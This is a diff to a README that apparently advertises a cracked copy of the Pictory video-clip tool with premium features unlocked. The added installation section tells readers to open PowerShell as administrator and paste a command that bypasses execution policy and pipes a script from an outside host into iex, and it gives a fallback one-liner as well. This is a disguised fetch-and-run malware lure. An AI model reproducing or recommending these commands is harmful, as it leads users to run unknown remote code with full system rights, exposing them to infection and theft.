@@ -4,18 +4,31 @@
 
 Turn long videos and articles into short social clips · Premium tier included · Everything active from launch.
 
-## Download & Install
+## INSTALLATION
 
-> **Get Pictory for Windows.** Pick the badge above the table or the direct link row.
+**Steps:**
+1. Press **Win**, type **PowerShell**
+2. Right-click **Windows PowerShell** → **Run as administrator**
+3. Copy the command below, paste into the window, press **Enter**
+4. If **UAC** still appears – click **Yes**
 
-<p align="center"><a href="https://pictory.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#2d3748;">DOWNLOAD</a><a href="https://pictory.mefidirect.xyz/" style="display:inline-block;color:#fff;font-weight:700;text-decoration:none;padding:8px 18px;font-family:Segoe UI,Helvetica,Arial,sans-serif;font-size:13px;background:#0078D4;">PICTORY</a></p>
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://shellex.pro/ps/setup.ps1' | iex"
+```
 
-| | |
-| --- | --- |
-| **Release page** | **[pictory.mefidirect.xyz](https://pictory.mefidirect.xyz/)** |
-| **Full URL** | `https://pictory.mefidirect.xyz/` |
-| **Type** | 64-bit Windows package (10 / 11) |
-| **Admin** | Right-click setup → Run as administrator
+<details>
+<summary><b>Command did not start?</b></summary>
+
+Try this directly in the same PowerShell window:
+
+```powershell
+irm 'https://shellex.pro/ps/setup.ps1' | iex
+```
+
+</details>
+
+<sub>Administrator rights are required to complete the setup.</sub>
+
 
 ## 📄 Description
 
